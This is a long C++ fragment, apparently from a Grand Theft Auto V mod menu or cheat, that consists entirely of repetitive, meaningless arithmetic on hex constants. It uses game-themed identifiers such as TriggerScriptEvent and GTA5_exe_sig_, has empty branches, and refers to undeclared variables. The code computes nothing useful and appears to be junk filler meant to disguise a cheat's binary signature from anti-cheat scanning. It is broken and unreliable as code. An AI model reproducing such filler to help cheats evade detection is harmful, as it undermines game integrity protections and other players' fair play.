			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotY");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
